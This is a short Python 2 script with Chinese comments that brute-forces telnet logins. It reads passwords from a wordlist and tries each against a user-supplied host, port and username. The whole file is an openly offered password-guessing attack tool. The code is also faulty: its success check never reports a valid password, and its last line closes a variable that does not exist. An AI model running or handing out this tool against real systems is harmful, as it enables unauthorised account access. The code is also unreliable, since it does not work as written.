#!/usr/bin/python
#coding:utf-8

#-----------------------------------
#   程序：v1.0
#   作者：vforbox
#   语言：python 2.7
#   操作：Linux 运行
#   功能：爆破telnet登陆密码
#------------------------------------

import time
import telnetlib

def telnet(Host,Port,Username,Password,Finish):
    # 连接Telnet服务器,超时1秒
    tn = telnetlib.Telnet(Host,Port,timeout=1)
    # 显示连接信息
    tn.set_debuglevel(3)
    # 输入登录用户
    tn.read_until('login: ')
    tn.write(Username + '\n')
    # 输入登录密码
    tn.read_until('Password: ')
    tn.write(Password + '\n')
    # 判断密码错误提示,如果没有提示则登陆成功
    if tn.read_until(Finish):
        print "Telnet login filed!\n"
    # 终止Telnet连接
    tn.write('exit\n')  # or tn.close()

if __name__=='__main__':
    Host = raw_input("IP/Domain: ")     # Telnet服务器IP
    Port = int(raw_input("Port: "))     # Telnet服务器端口
    Username = raw_input('Username: ')  # 登陆用户名
    Finish = 'incorrect'                # 密码错误提示
    Pwd_file = raw_input("Password file: ")     #密码文件
    Pwd_file2 = open(Pwd_file,'r+')
    x = 0
    i = 1
    print "\n",time.strftime("%Y-%m-%d %H:%M "),": caonnect Telnet begin..","\n"
    while 1:
        Password = Pwd_file2.readline().strip('\n')
        x += 1
        print x,time.strftime("%Y-%m-%d %H:%M "),": Is trying to login","",Username,":",Password,"\n"
        if len(Password) == 0:
            break
        telnet(Host,Port,Username,Password,Finish)
    Pwd2_file.close()